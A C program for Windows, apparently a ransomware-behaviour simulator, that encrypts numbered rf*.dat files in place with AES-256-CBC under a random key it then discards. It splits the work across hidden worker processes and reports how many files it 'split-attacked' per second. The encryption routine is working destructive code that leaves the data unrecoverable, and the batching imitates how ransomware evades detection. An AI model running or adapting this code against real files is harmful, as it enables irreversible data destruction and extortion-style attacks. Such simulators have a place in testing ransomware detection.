#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "bcrypt.lib")

static const unsigned char IV0[16] = {
    0x10, 0x32, 0x54, 0x76, 0x98, 0xBA, 0xDC, 0xFE,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF
};

static void encrypt_one(const char *dir, int i)
{
    char path[300];
    HANDLE h;
    DWORD sz, blk, got = 0, put = 0;
    unsigned char *buf, *out, key[32], iv[16];
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE k = NULL;
    ULONG ol = 0;

    _snprintf_s(path, sizeof(path), _TRUNCATE, "%s\\rf%d.dat", dir, i);
    h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return;
    sz = GetFileSize(h, NULL);
    blk = sz & ~15u;
    buf = (unsigned char *)malloc(blk);
    out = (unsigned char *)malloc(blk);
    if (!buf || !out) { CloseHandle(h); free(buf); free(out); return; }

    SetFilePointer(h, 0, NULL, FILE_BEGIN);
    ReadFile(h, buf, blk, &got, NULL);

    BCryptGenRandom(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    memcpy(iv, IV0, 16);
    BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(alg, &k, NULL, 0, key, 32, 0);
    BCryptEncrypt(k, buf, blk, NULL, iv, 16, out, blk, &ol, 0);

    SetFilePointer(h, 0, NULL, FILE_BEGIN);
    WriteFile(h, out, ol, &put, NULL);
    FlushFileBuffers(h);

    BCryptDestroyKey(k);
    BCryptCloseAlgorithmProvider(alg, 0);
    SecureZeroMemory(key, sizeof(key));
    CloseHandle(h);
    free(buf);
    free(out);
}

int main(int argc, char **argv)
{
    if (argc >= 5 && strcmp(argv[1], "worker") == 0) {
        const char *dir = argv[2];
        int start = atoi(argv[3]);
        int cnt = atoi(argv[4]);
        int i;
        for (i = start; i < start + cnt; i++)
            encrypt_one(dir, i);
        return 0;
    }

    if (argc >= 6 && strcmp(argv[1], "run") == 0) {
        const char *dir = argv[2];
        int total = atoi(argv[3]);
        int batch = atoi(argv[4]);
        int par = atoi(argv[5]);
        char self[MAX_PATH];
        int nproc, p, j, s;
        HANDLE *slots;
        LARGE_INTEGER f, t0, t1;
        double ms;

        if (batch < 1) batch = 1;
        if (par < 1) par = 1;
        GetModuleFileNameA(NULL, self, MAX_PATH);
        nproc = (total + batch - 1) / batch;
        slots = (HANDLE *)calloc(par, sizeof(HANDLE));

        QueryPerformanceFrequency(&f);
        QueryPerformanceCounter(&t0);
        for (p = 0; p < nproc; p++) {
            char cmd[600];
            int start = p * batch;
            int cnt = batch;
            STARTUPINFOA si;
            PROCESS_INFORMATION pi;

            if (start + cnt > total) cnt = total - start;

            s = -1;
            for (j = 0; j < par; j++) if (slots[j] == NULL) { s = j; break; }
            if (s < 0) {
                DWORD w = WaitForMultipleObjects(par, slots, FALSE, INFINITE);
                s = (int)(w - WAIT_OBJECT_0);
                CloseHandle(slots[s]);
                slots[s] = NULL;
            }

            _snprintf_s(cmd, sizeof(cmd), _TRUNCATE, "\"%s\" worker \"%s\" %d %d",
                        self, dir, start, cnt);
            ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                               NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hThread);
                slots[s] = pi.hProcess;
            }
        }
        for (j = 0; j < par; j++)
            if (slots[j]) { WaitForSingleObject(slots[j], INFINITE); CloseHandle(slots[j]); }
        QueryPerformanceCounter(&t1);

        ms = (double)(t1.QuadPart - t0.QuadPart) * 1000.0 / (double)f.QuadPart;
        printf("split-attacked %d files via %d procs (batch %d, par %d) in %.1f ms (%.0f files/s)\n",
               total, nproc, batch, par, ms, ms > 0 ? total * 1000.0 / ms : 0.0);
        free(slots);
        return 0;
    }

    printf("usage: splitter run <dir> <total> <batch> <parallel> | splitter worker <dir> <start> <count>\n");
    return 1;
}
